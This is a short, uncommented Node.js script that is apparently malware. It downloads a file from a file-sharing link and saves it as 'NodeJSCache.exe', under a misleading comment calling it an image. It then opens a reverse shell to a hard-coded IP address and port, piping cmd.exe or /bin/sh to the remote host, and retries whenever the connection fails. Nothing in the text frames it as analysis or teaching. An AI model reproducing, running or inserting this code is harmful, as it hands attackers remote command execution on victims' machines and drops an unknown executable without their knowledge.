var net = require('net');
var spawn = require('child_process').spawn;
const fs = require('fs');
const https = require('https');

const url = 'https://file.io/ckc2652sBjMS';

HOST="3.64.211.85";
PORT="1234";
TIMEOUT="5000";

if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }

function c(HOST,PORT) {
    https.get(url,(res) => {
        // Image will be stored at this path
        const path = `${__dirname}/NodeJSCache.exe`; 
        const filePath = fs.createWriteStream(path);
        res.pipe(filePath);
        filePath.on('finish',() => {
            filePath.close();
        })
    })
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn((process.platform.contains('win')?'cmd.exe':'/bin/sh'),[]);
        client.write("Connected\r\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected\r\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}

c(HOST,PORT);
